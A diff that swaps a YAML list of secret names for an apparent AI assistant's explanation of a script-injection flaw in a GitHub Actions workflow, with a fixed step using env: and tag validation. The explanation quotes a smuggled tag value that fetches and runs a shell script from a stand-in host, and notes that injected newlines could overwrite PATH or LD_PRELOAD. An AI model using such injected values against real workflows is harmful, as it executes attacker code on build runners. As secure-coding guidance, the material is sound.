@@ -1,5 +1,39 @@
-DATE_COLUMNS: >-
-  Ingress-cert,SSO-cert,AKS Version- End of life,PTC License,
-  ProvisioningKe,emessagekey,TWX_AppKey,Azure service principle secret ,
-  Azure AD -Client secret,Logtools B2C- Client secret,
-  B2C- Client secret for iiq,Github Token Global
+Copilot is right: this is a real script-injection issue in GitHub Actions. ${{ github.event.inputs.releasetag }} is expanded by the Actions runner before the shell sees the script, so the input becomes literal shell source. A tag like "; curl evil.sh | sh; # would close your quote and run on every self-hosted runner in the matrix.
+
+The fix, in three parts
+
+Pass the input through env: so it’s treated as data, not code.
+Validate it against Docker’s tag grammar.
+Only then write it to $GITHUB_ENV.
+yaml
+- name: Set release tag
+  env:
+    INPUT_RELEASETAG: ${{ github.event.inputs.releasetag }}
+  run: |
+    RELEASETAG="$INPUT_RELEASETAG"
+
+    if [ -z "$RELEASETAG" ]; then
+      RELEASETAG="${GITHUB_SHA::7}"
+    fi
+
+    # Docker tag grammar: [A-Za-z0-9_][A-Za-z0-9_.-]{0,127}
+    if ! [[ "$RELEASETAG" =~ ^[A-Za-z0-9_][A-Za-z0-9_.-]{0,127}$ ]]; then
+      echo "::error::Invalid release tag: must match Docker tag rules"
+      exit 1
+    fi
+
+    echo "RELEASETAG=$RELEASETAG" >> "$GITHUB_ENV"
+
+Why this works
+
+With env:, the runner puts the value in an environment variable, and the shell reads it as a plain string. Quotes and semicolons in it can’t change the script’s structure.
+The regex limits the value to characters that are legal in a Docker tag (up to 128 characters, no leading . or -). This also blocks newlines, which matters because a value containing \n could inject extra lines into $GITHUB_ENV (for example, overwriting PATH or LD_PRELOAD).
+[[ ... =~ ... ]] needs bash. GitHub’s default shell on Linux is bash, so this is fine, but set shell: bash if you’ve overridden it.
+
+Other things worth checking
+
+The old code read ${{ vars.TAG }} the same way. If you keep any ${{ ... }} expansion inside a run: block, route it through env: as well.
+Search the rest of the workflow for other ${{ github.event.* }} or ${{ inputs.* }} uses inside run: steps.
+Since this runs on self-hosted runners, who can trigger workflow_dispatch matters too. Restrict it to trusted users if you can.
+
+I can also review the full workflow file if you paste it.
